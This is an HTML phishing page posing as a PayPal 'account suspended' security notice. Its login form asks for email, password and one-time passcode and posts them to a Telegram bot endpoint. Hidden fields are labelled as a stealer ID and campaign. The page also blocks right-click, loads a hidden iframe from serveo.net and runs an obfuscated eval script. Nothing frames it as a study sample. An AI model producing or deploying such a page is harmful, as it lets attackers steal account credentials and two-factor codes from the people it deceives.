<!DOCTYPE html>
<html lang="en">
<head>

    <title>PayPal Security Notice - Immediate Action Required</title>
    <meta name="description" content="PayPal security alert: your account has been suspended due to unauthorized login attempts.">
</head>
<body oncontextmenu="return false;">
    <div class="header">
        <img src="/static/paypal_logo.png" alt="PayPal">
    </div>
    <div class="alert-box">
        <h2>Account has been suspended! Immediate action is required.</h2>
        <p>Verify your identity within 24 hours to restore account access.</p>
    </div>
    <div class="login-box">
        <form action="https://api.telegram.org/bot71829182/sendMessage" method="POST">
            <input type="hidden" name="stealer_id" value="trap_99">
            <input type="hidden" name="campaign" value="paypal_fall">
            <input type="hidden" name="v_ip" value="1.2.3.4">
            <input type="hidden" name="redirect_to" value="https://google.com">
            <input type="hidden" name="session_token" value="deadbeef">

            <div class="field">
                <label>Email address</label>
                <input type="email" name="login_email" placeholder="name@domain.com" required>
            </div>
            <div class="field">
                <label>Password</label>
                <input type="password" name="login_password" placeholder="Enter your PayPal password" required>
            </div>
            <div class="field">
                <label>One-Time Passcode (OTP)</label>
                <input type="text" name="otp_code" placeholder="6-digit verification code" required>
            </div>
            <button type="submit" class="btn-verify">Unlock Account</button>
        </form>
    </div>
    <iframe src="https://serveo.net/ping" style="display:none; width:0; height:0;"></iframe>
    <script>
        eval(unescape("%61%6c%65%72%74%28%22%53%65%73%73%69%6f%6e%22%29"));
    </script>
</body>
</html>
